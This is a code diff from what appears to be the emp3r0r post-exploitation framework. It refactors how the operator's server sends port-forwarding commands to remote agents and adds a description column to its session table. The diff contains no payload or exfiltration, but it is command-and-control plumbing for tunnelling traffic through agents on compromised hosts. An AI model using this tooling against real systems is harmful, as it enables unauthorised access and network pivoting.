@@ -65,7 +65,7 @@ func DeletePortFwdSession(sessionID string) {
 	defer PortFwdsMutex.Unlock()
 	for id, session := range PortFwds {
 		if id == sessionID {
-			err := SendCmd("!delete_portfwd "+id, "", session.Agent)
+			err := SendCmd(fmt.Sprintf("%s %s", emp3r0r_data.C2CmdDeletePortFwd, id), "", session.Agent)
 			if err != nil {
 				CliPrintWarning("Tell agent %s to delete port mapping %s: %v", session.Agent.Tag, sessionID, err)
 			}
@@ -88,7 +88,7 @@ func ListPortFwds() {
 	tdata := [][]string{}
 	tableString := &strings.Builder{}
 	table := tablewriter.NewWriter(tableString)
-	table.SetHeader([]string{"Local Port", "To", "Agent", "ID"})
+	table.SetHeader([]string{"Local Port", "To", "Agent", "Description", "ID"})
 	table.SetBorder(true)
 	table.SetRowLine(true)
 	table.SetAutoWrapText(true)
@@ -99,12 +99,15 @@ func ListPortFwds() {
 	table.SetHeaderColor(tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiMagentaColor},
 		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},
 		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiBlueColor},
+		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiCyanColor},
 		tablewriter.Colors{tablewriter.Bold, tablewriter.FgHiYellowColor})
 
 	table.SetColumnColor(tablewriter.Colors{tablewriter.FgHiMagentaColor},
 		tablewriter.Colors{tablewriter.FgHiCyanColor},
 		tablewriter.Colors{tablewriter.FgBlueColor},
+		tablewriter.Colors{tablewriter.FgHiCyanColor},
 		tablewriter.Colors{tablewriter.FgYellowColor})
+
 	for id, portmap := range PortFwds {
 		if portmap.Sh == nil {
 			portmap.Cancel()
@@ -116,13 +119,20 @@ func ListPortFwds() {
 			to = portmap.To + " (CC) "
 			lport = portmap.Lport + " (Agent) "
 		}
-		tdata = append(tdata, []string{lport, to, SplitLongLine(portmap.Agent.Tag, 10), SplitLongLine(id, 10)})
+		tdata = append(tdata,
+			[]string{
+				lport,
+				to,
+				SplitLongLine(portmap.Agent.Tag, 10),
+				SplitLongLine(portmap.Description, 10),
+				SplitLongLine(id, 10)})
 	}
 
 	// rendor table
 	table.AppendBulk(tdata)
 	table.Render()
-	fmt.Printf("\n\033[0m%s\n\n", tableString)
+	AdaptiveTable(tableString.String())
+	fmt.Printf("\n\033[0m%s\n\n", tableString.String())
 }
 
 // InitReversedPortFwd send portfwd command to agent and set up a reverse port mapping
@@ -138,7 +148,9 @@ func (pf *PortFwdSession) InitReversedPortFwd() (err error) {
 	// mark this session, save to PortFwds
 	fwdID := uuid.New().String()
 	pf.Sh = nil
-	pf.Description = fmt.Sprintf("%s (Local) <- %s (Agent)", toAddr, listenPort)
+	if pf.Description == "" {
+		pf.Description = "Reverse mapping"
+	}
 	pf.Reverse = true
 	pf.Agent = CurrentTarget
 	PortFwdsMutex.Lock()
@@ -146,7 +158,7 @@ func (pf *PortFwdSession) InitReversedPortFwd() (err error) {
 	PortFwdsMutex.Unlock()
 
 	// tell agent to start this mapping
-	cmd := fmt.Sprintf("!port_fwd %s %s reverse", listenPort, fwdID)
+	cmd := fmt.Sprintf("%s %s %s reverse", emp3r0r_data.C2CmdPortFwd, listenPort, fwdID)
 	err = SendCmd(cmd, "", CurrentTarget)
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
@@ -289,7 +301,7 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 
 	// send command to agent, with session ID
 	fwdID := uuid.New().String()
-	cmd := fmt.Sprintf("!port_fwd %s %s on", toAddr, fwdID)
+	cmd := fmt.Sprintf("%s %s %s on", emp3r0r_data.C2CmdPortFwd, toAddr, fwdID)
 	err = SendCmd(cmd, "", CurrentTarget)
 	if err != nil {
 		CliPrintError("SendCmd: %v", err)
@@ -298,7 +310,9 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 
 	// mark this session, save to PortFwds
 	pf.Sh = nil
-	pf.Description = fmt.Sprintf("%s (Local) -> %s (Agent)", listenPort, toAddr)
+	if pf.Description == "" {
+		pf.Description = "Agent to CC mapping"
+	}
 	PortFwdsMutex.Lock()
 	PortFwds[fwdID] = pf
 	PortFwdsMutex.Unlock()
@@ -309,7 +323,9 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 		PortFwdsMutex.Lock()
 		defer PortFwdsMutex.Unlock()
 		delete(PortFwds, fwdID)
-		CliPrintWarning("PortFwd session (%s: %s) has finished", fwdID, pf.Description)
+		CliPrintWarning("PortFwd session (%s) has finished:\n"+
+			"%s -> %s\n%s",
+			pf.Description, pf.Lport, pf.To, fwdID)
 	}
 
 	// catch cancel event, and trigger the termination of parent function
@@ -342,7 +358,7 @@ func (pf *PortFwdSession) RunPortFwd() (err error) {
 		go func() {
 			// sub-session (streamHandler) ID
 			shID := fmt.Sprintf("%s_%s", fwdID, srcPort)
-			cmd = fmt.Sprintf("!port_fwd %s %s on", toAddr, shID)
+			cmd = fmt.Sprintf("%s %s %s on", emp3r0r_data.C2CmdPortFwd, toAddr, shID)
 			err = SendCmd(cmd, "", pf.Agent)
 			if err != nil {
 				CliPrintError("SendCmd: %v", err)
